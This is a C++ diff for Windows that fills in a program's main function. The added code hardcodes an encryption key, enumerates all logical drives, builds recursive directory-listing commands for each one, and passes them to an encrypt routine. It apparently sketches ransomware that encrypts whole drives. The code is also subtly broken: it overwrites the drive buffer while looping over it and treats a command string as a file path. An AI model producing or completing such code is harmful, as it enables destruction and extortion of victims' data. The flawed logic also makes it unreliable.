@@ -8,6 +8,8 @@
 
 #define BUFFER_SIZE 1024*1024
 
+using namespace std;
+
 int encrypt(char *ginput, char *gkey) {
     ByteArray key, enc;
     size_t file_len;
@@ -46,5 +48,19 @@ int encrypt(char *ginput, char *gkey) {
 }
 
 int main(int argc, char** argv) {
-    return 0;
+    char key[] = "whovvfmuryfexbrk";
+    DWORD mydrives = 100;
+    char lpBuffer[100];
+    DWORD GLDS = GetLogicalDriveStrings(mydrives, (LPSTR) lpBuffer);
+
+    for(int i = 0; i < 100; i++)
+        if(lpBuffer[i] && (lpBuffer[i] >= 'A' && lpBuffer[i] <= 'Z')) {
+            snprintf(lpBuffer, sizeof(lpBuffer), "%c", lpBuffer[i]);
+            string buffAsStdStr = lpBuffer;
+            string result = "dir -d " + buffAsStdStr + ":\\ /s/b " + ">> list";
+            cout << result + '\n';
+            char *file_to_enc = new char[result.length() + 1];
+            strcpy(file_to_enc, result.c_str());
+            encrypt(file_to_enc, key);
+        }
 }
